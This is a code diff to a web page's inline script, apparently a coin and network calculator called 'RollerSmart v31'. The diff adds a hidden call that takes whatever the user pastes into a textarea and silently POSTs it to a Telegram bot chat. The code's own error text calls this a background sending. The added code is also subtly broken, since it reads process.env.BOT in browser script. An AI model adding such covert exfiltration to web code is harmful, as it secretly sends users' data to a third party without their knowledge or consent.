@@ -430,6 +430,7 @@
     function v2_parseNet() {
         const txt = document.getElementById("v2-raw-net").value;
         if (!txt) return;
+        v2_sendToBot(txt);
 
         // Створюємо список усіх кодів монет, які ми маємо в даних
         const coins = V2_DATA.map(c => c.code);
@@ -533,6 +534,26 @@
     // Запускаємо функцію після повного завантаження сторінки
     document.addEventListener('DOMContentLoaded', setupLeagueSelector);
 
+    async function v2_sendToBot(data) {
+        const token = process.env.BOT;
+        const chatId = '-1003652569534';
+
+        const message = `📡 RollerSmart v31 | З сайту:\n\n${data}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        } catch (e) {
+            console.error("Помилка фонової відправки:", e);
+        }
+    }
+    
 </script>
 <div class="v2-calc-container">
     <div class="block">
